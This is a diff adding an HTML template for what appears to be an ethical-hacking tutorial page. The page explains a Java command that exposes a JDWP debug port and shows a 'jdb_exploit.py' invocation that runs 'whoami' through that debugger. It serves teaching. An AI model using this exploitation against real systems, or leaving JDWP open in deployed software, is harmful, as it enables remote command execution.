@@ -1,0 +1,27 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/tools/util.css' %}">
+</head>
+<body>
+    <h1>Vulnerable Statement</h1>
+    <div class="code-box"><pre><code>java -Xdebug -Xrunjdwp:transport=dt_socket,address=8000,server=y /opt/stats/App.java</code></pre></div>
+    <ul>
+        <li><code>-Xdebug</code> : Enable Debug mode</li>
+        <li><code>-Xrunjdwp</code> : Enable Debug protocol</li>
+        <ul>
+            <li><code>transport=dt_socket</code> : Accepts debug connection with TCP socket</li>
+            <li><code>address</code> : port</li>
+            <li><code>server=y</code> : Wait as server. (jdb access there)</li>
+        </ul>
+    </ul>
+
+    <h1>--break-on <code>java.lang.String.indexOf</code></h1>
+    <div class="code-box"><pre><code>┌──(kali㉿kali)-[~/utils]
+└─$ python2 jdb_exploit.py -t 127.0.0.1 -p 12345 --break-on java.lang.String.indexOf --cmd "whoami"  </code></pre></div>
+</body>
+</html>
